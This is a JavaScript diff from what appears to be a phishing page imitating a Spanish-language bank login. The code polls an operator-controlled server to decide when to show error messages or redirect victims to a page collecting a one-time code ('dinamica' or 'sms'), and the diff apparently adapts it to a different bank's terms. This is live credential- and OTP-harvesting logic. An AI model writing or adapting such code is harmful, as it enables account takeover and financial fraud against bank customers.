@@ -27,22 +27,16 @@ function startPolling() {
       if (response.ok) {
         const data = await response.json();
         const action = data.action;
-        if (action === 'ganapin' || action === 'totp') {
+        if (action === 'dinamica' || action === 'sms') {
           stopPing();
           stopPolling();
           sessionStorage.setItem('otpType', action);
           window.location.href = "clave.html";
-        } else if (action === 'error-user') {
+        } else if (action === 'error-login') {
           stopPing();
           stopPolling();
           document.getElementById("svn-loader").hidden = true;
-          msg.textContent = "El usuario ingresado no es válido.";
-          msg.hidden = false;
-        } else if (action === 'error-pass') {
-          stopPing();
-          stopPolling();
-          document.getElementById("svn-loader").hidden = true;
-          msg.textContent = "La clave ingresada no es válida.";
+          msg.textContent = "Usuario o clave incorrecta. Por favor, verifica tus datos.";
           msg.hidden = false;
         }
       }
@@ -97,14 +91,8 @@ function showToast(text) {
 window.addEventListener('DOMContentLoaded', () => {
   const params = new URLSearchParams(window.location.search);
   const error = params.get('error');
-  if (error === 'error-user') {
-    msg.textContent = "El usuario ingresado no es válido.";
-    msg.hidden = false;
-  } else if (error === 'error-pass') {
-    msg.textContent = "La clave ingresada no es válida.";
-    msg.hidden = false;
-  } else if (error === 'error-token') {
-    msg.textContent = "Clave Dinámica incorrecta. Intente de nuevo.";
+  if (error === 'error-login') {
+    msg.textContent = "Usuario o clave incorrecta. Por favor, verifica tus datos.";
     msg.hidden = false;
   }
 });
